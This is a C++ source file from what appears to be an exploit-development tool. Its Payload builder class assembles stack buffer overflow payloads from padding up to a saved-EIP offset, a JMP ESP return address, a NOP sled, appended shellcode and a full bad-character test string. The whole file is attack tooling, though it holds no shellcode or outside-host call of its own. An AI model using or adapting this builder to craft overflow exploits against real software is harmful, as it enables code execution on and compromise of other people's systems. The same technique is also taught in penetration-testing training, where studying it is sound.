#include "Stages/Payload.hpp"

Payload* Payload::builder()
{
    return new Payload();
}

Payload::Payload()
{
    this->buffer = "";
}

std::string Payload::get()
{
    return this->buffer;
}

Payload* Payload::padding(char character)
{
    if (Application::eipOffset == std::string::npos)
        return this;

    for (uint32_t i = 0; i < Application::eipOffset; i++)
        this->buffer += std::string(1, character);
    return this;
}

Payload* Payload::eip()
{
    uint32_t jmpEsp = (uint32_t)Application::jmpEsp;
    for (int32_t i = 0; i < 4; i++)
        this->buffer += std::string(1, (char)((jmpEsp >> (8* i)) & 0xff));
    return this;
}

Payload* Payload::nopSled(uint32_t length)
{
    for (uint32_t i = 0; i < length; i++)
        this->buffer += std::string(1, '\x90');
    return this;
}

Payload* Payload::append(std::string input)
{
    this->buffer += input;
    return this;
}

Payload* Payload::badCharacters()
{
    for (uint32_t i = 1; i <= 255; i++)
    {
        // Set bad characters to NOP
        if (std::find(Application::badCharacters.begin(), Application::badCharacters.end(), (uint8_t)i) != Application::badCharacters.end())
        {
            this->buffer += std::string(1, '\x90');
            continue;
        }
        this->buffer += std::string(1, (char)i);
    }
    return this;
}
